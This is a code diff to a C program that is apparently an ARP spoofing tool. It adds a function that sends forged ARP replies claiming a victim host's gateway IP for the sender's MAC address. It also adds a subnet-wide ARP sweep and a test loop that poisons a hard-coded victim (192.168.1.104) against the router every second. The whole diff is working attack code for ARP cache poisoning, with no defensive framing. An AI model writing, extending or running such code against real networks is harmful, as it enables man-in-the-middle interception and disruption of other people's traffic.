@@ -10,8 +10,7 @@ cheater_arp_sender(
     unsigned char   *source_mac,
     unsigned short  opcode,
     unsigned int    target_ip,
-    unsigned int    source_ip
-    )
+    unsigned int    source_ip)
 {
     unsigned char   packet[42]  = {0};
     struct _ethhdr  *eth        = packet;
@@ -61,11 +60,6 @@ cheater_arp_reply_sender(
                                 source_ip);
 }
 
-// int
-// cheater_arp_reply_broadcast_sender(
-//     unsigned char   *source_mac,
-//     )
-
 
 int
 cheater_arp_request_sender(
@@ -93,6 +87,36 @@ cheater_arp_request_broadcast_sender(
 }
 
 
+int
+cheater_arp_throw_shit(unsigned int target, unsigned int iwannabe)
+{
+    unsigned int    tidx    = _ntoh32(target & (~net_info->ip_mask));
+    unsigned int    iidx    = _ntoh32(iwannabe & (~net_info->ip_mask));
+
+    if(iidx > net_info->d_arr_max || tidx > net_info->d_arr_max)
+    {
+        _MESSAGE_OUT("[!] wtf??? \n");
+    }
+
+    if(false == net_info->d_arr[iidx].is_online)
+    {
+        _MESSAGE_OUT("[!] %s is not online!\n", _netint32toip(iwannabe));
+        return false;
+    }
+    if(false == net_info->d_arr[tidx].is_online)
+    {
+        _MESSAGE_OUT("[!] %s is not online!\n", _netint32toip(target));
+        return false;
+    }
+
+
+    return cheater_arp_reply_sender(    net_info->d_arr[tidx].mac,
+                                        net_info->mac,
+                                        target,
+                                        iwannabe);
+}
+
+
 
 void
 cheater_test(void)
@@ -113,13 +137,28 @@ cheater_test(void)
 
     }
 #endif
+
+    int i=0;
+    for(i=0; i<net_info->d_arr_max; i++)
+    {
+        cheater_arp_request_broadcast_sender(
+            net_info->mac,
+            net_info->ip_netint32 & net_info->ip_mask | _ntoh32(i),
+            net_info->ip_netint32);
+    }
+
+    net_info->d_arr[104].is_online      = true;
+    memcpy(net_info->d_arr[104].mac, "\x24\x24\xe\x41\x58\xc7", 6);
+    net_info->d_arr[104].ip_netint32    = _iptonetint32("192.168.1.104");
+
+    net_info->d_arr[1].is_online        = true;
+    memcpy(net_info->d_arr[1].mac, "\xd8\x15\xd\x8c\x4\xfe", 6);
+    net_info->d_arr[1].ip_netint32      = _iptonetint32("192.168.1.1");
+
+
     while(1)
     {
-        cheater_arp_reply_sender(
-                                    "\x24\x24\x0e\x41\x58\xc7",
-                                    "\xd4\x33\xa3\x11\x11\x11",
-                                    _iptonetint32("192.168.1.104"),
-                                    _iptonetint32("192.168.1.1"));
+        cheater_arp_throw_shit(_iptonetint32("192.168.1.104"), net_info->ip_route_netint32);
         sleep(1);
     }
 }
